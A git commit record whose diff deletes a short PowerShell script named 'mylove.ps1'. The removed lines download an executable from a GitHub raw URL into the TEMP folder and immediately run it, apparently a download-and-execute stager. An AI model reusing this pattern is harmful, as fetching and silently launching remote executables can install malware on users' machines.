cbfa3e4360c7858783990f71da7b8b59172992f9
KONICHIVAA <konichiva977@gmail.com>
2025-05-29 11:25:58 +0100

    Delete mylove.ps1

--- mylove.ps1
+++
@@ -1,4 +0,0 @@
-$wc=New-Object System.Net.WebClient
-$wc.DownloadFile("https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/master/MessageBOX.exe", "$env:TEMP\MessageBOX.exe")
-Start-Process "$env:TEMP\MessageBOX.exe"
-
